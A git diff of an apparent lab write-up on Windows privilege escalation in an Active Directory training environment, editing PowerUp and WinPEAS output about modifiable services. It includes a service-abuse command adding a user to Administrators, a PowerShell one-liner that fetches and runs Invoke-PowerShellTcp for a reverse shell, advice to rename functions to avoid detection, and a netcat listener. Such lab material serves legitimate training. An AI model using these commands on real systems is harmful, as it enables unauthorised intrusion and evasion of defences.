@@ -95,21 +95,12 @@ We can use Powerup from PowerSploit module to check for any privilege escalation
 
 ServiceName    : AbyssWebServer📌
 Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
-ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
 StartName      : LocalSystem
 AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
 CanRestart     : True📌
 Name           : AbyssWebServer
 Check          : Unquoted Service Paths📌
-
-ServiceName    : AbyssWebServer
-Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
-ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
-CanRestart     : True
-Name           : AbyssWebServer
-Check          : Unquoted Service Paths
 
 [SNIP]
 
@@ -138,14 +129,6 @@ CanRestart    : True📌
 Name          : AbyssWebServer
 Check         : Modifiable Services
 
-ServiceName   : SNMPTRAP📌
-Path          : C:\Windows\System32\snmptrap.exe
-StartName     : LocalSystem📌
-AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'📌
-CanRestart    : True📌
-Name          : SNMPTRAP
-Check         : Modifiable Services
-
 [SNIP]
 ```
 
@@ -163,7 +146,7 @@ VERBOSE: Leaving service 'AbyssWebServer' in stopped state
 
 ServiceAbused  Command
 -------------  -------
-AbyssWebServer net localgroup Administrators dcorp\student422 /add
+AbyssWebServer net localgroup Administrators dcorp\student422 /add⏫
 ```
 
 We can see that the `dcorp\student422` is a local administrator now.
@@ -251,8 +234,8 @@ Spend some time analyzing the output of WinPEAS. You will find useful informatio
 ╔══════════╣ Interesting Services -non Microsoft-
 ╚ Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
     AbyssWebServer(Aprelium - Abyss Web Server)[C:\WebServer\Abyss Web Server\abyssws.exe -service] - Auto - Stopped - No quotes and Space detected📌
-    YOU CAN MODIFY THIS SERVICE: AllAccess📌
-    File Permissions: Everyone [AllAccess]
+    YOU CAN MODIFY THIS SERVICE: AllAccess
+    File Permissions: Everyone [AllAccess]📌
     Possible DLL Hijacking in binary folder: C:\WebServer\Abyss Web Server (Everyone [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])📌
 [1;90m   =================================================================================================
 
@@ -266,7 +249,7 @@ Spend some time analyzing the output of WinPEAS. You will find useful informatio
     LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
     AbyssWebServer: AllAccess📌
     RmSvc: GenericExecute (Start/Stop)
-    SNMPTRAP: AllAccess📌
+    SNMPTRAP: AllAccess
     ConsentUxUserSvc_21fd24: GenericExecute (Start/Stop)
     CredentialEnrollmentManagerUserSvc_21fd24: GenericExecute (Start/Stop)
     DeviceAssociationBrokerSvc_21fd24: GenericExecute (Start/Stop)
@@ -464,7 +447,7 @@ If using `Invoke-PowerShellTcp`, make sure to include the function call in the s
 
 **Please note that you may always like to rename the function name to something else to avoid detection.**
 
-```
+```powershell
 powershell.exe iex (iwr http://172.16.100.22/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.22 -Port 443
 ```
 
@@ -483,6 +466,8 @@ Double check the following:
 ![Windows Firewall - Turn off](./assets/screenshots/learning_objective_05_windows_firewall_turn_off.png)
 
 On the student VM, run a netcat or powercat listener which listens on the port which we used above.
+
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`:
 ```
